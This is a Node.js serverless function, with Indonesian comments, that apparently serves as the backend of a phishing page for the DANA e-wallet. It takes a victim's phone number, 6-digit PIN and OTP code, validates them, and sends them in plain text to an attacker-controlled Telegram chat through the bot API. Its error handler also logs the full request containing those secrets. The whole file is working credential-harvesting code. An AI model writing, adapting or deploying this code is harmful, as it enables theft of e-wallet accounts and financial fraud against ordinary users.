const axios = require('axios');

// Format Telegram message tanpa tanda hubung
function formatMessage(type, phone, pin, otp) {
  // Hapus semua karakter non-digit
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

// Validasi format nomor telepon Indonesia
function isValidIndonesianPhone(phone) {
  const cleanPhone = phone.replace(/\D/g, '');
  return cleanPhone.length >= 10 && cleanPhone.length <= 13 && cleanPhone.startsWith('8');
}

// Validasi PIN (6 digit)
function isValidPIN(pin) {
  return /^\d{6}$/.test(pin);
}

// Validasi OTP (4 digit)
function isValidOTP(otp) {
  return /^\d{4}$/.test(otp);
}

module.exports = async (req, res) => {
  // Set CORS headers untuk keamanan
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    // Parse dan validasi request
    const { type, phone, pin, otp } = req.body;
    
    // Validasi input
    if (!type || !phone) {
      return res.status(400).json({ error: 'Type dan phone diperlukan' });
    }

    if (!isValidIndonesianPhone(phone)) {
      return res.status(400).json({ error: 'Format nomor telepon Indonesia tidak valid' });
    }

    if (type === 'pin' && (!pin || !isValidPIN(pin))) {
      return res.status(400).json({ error: 'Format PIN tidak valid (harus 6 digit)' });
    }

    if (type === 'otp' && (!otp || !isValidOTP(otp))) {
      return res.status(400).json({ error: 'Format OTP tidak valid (harus 4 digit)' });
    }

    // Bersihkan nomor telepon
    const cleanPhone = phone.replace(/\D/g, '');
    
    if (cleanPhone.length < 10) {
      return res.status(400).json({ error: 'Nomor telepon harus minimal 10 digit' });
    }

    // Cek konfigurasi Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Kredensial Telegram tidak ditemukan');
      return res.status(500).json({ error: 'Error konfigurasi server' });
    }

    // Log struktur request tanpa data sensitif
    console.log('Request diterima:', {
      type: type,
      phone_length: phone ? phone.length : 0,
      has_pin: !!pin,
      has_otp: !!otp,
      timestamp: new Date().toISOString()
    });

    // Format dan kirim pesan
    const message = formatMessage(type, cleanPhone, pin, otp);
    
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000 // Timeout 5 detik
      }
    );

    console.log('Pesan Telegram berhasil dikirim:', {
      status: telegramResponse.status,
      timestamp: new Date().toISOString()
    });

    return res.status(200).json({ 
      success: true,
      message: 'Data berhasil dikirim',
      telegram_status: telegramResponse.status
    });

  } catch (error) {
    console.error('Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      request: req.body
    });
    
    return res.status(500).json({
      error: 'Internal Server Error',
      details: process.env.NODE_ENV === 'development' ? error.message : 'Terjadi kesalahan'
    });
  }
};
